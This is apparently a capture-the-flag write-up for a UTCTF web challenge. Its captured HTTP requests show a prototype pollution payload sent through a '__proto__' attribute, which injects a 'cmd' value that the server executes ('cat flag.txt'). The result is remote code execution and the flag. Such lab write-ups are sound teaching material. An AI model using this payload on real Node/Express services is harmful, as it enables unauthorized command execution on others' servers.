
We are given the source code for this challenge

We are given the option to either create a company or merge companies

Lets try both, make sure to capture the requests in burp suite

The merge companies option uses `/api/absorbCompany/{companyID}`

We have to place the value of company ID in the api to merge companies
First lets create a company, the created company has an ID of `0`
Now put this in the abosorb company field. The request looks something like this

```http
POST /api/absorbCompany/0 HTTP/1.1
Host: guppy.utctf.live:8725
User-Agent: lol
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://guppy.utctf.live:8725/
Content-Type: application/json
Content-Length: 55
Origin: http://guppy.utctf.live:8725
Connection: close
Cookie: connect.sid=s%3A7t134QXHVsEKWChij352KUXiHl7VGiBk.0hMt8OWVepmqmu5wAke%2BCCplgead79nlLQeaHOjSCpg

{"attributes":["ASDF","AAAA"],"values":["ZXCV","BBBB"]}
```

And the response looks like

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Date: Mon, 01 Apr 2024 11:15:53 GMT
Connection: close
Content-Length: 184

{"merged":{"ASDF":"ZXCV","AAAA":"BBBB","cid":2},"err":{"code":126,"killed":false,"signal":null,"cmd":"./merger.sh"},"stdout":"","stderr":"/bin/sh: 1: ./merger.sh: Permission denied\n"}
```

In the code we can see that they are creating objects with the attributes and value we gave them.

We also see that after merging it also proceed to check if the `cmd` attributes  
exist on some random object. If not, it default's it to a random script and executes it.  
So by changing the value of the cmd attribute in all the object we could have an rce.

The exploit request looks like this 

```http
POST /api/absorbCompany/0 HTTP/1.1
Host: guppy.utctf.live:8725
User-Agent: lol
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://guppy.utctf.live:8725/
Content-Type: application/json
Content-Length: 62
Origin: http://guppy.utctf.live:8725
Connection: close
Cookie: connect.sid=s%3A7t134QXHVsEKWChij352KUXiHl7VGiBk.0hMt8OWVepmqmu5wAke%2BCCplgead79nlLQeaHOjSCpg

{"attributes":["__proto__"],"values":[{"cmd":"cat flag.txt"}]}
```

And in the response we get the flag. The response looks like

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Date: Mon, 01 Apr 2024 11:37:26 GMT
Connection: close
Content-Length: 118

{"merged":{"ASDF":"ZXCV","AAAA":"BBBB","cid":3},"err":null,"stdout":"utflag{p0lluted_b4ckdoorz_and_m0r3}","stderr":""}
```

flag : utflag{p0lluted_b4ckdoorz_and_m0r3}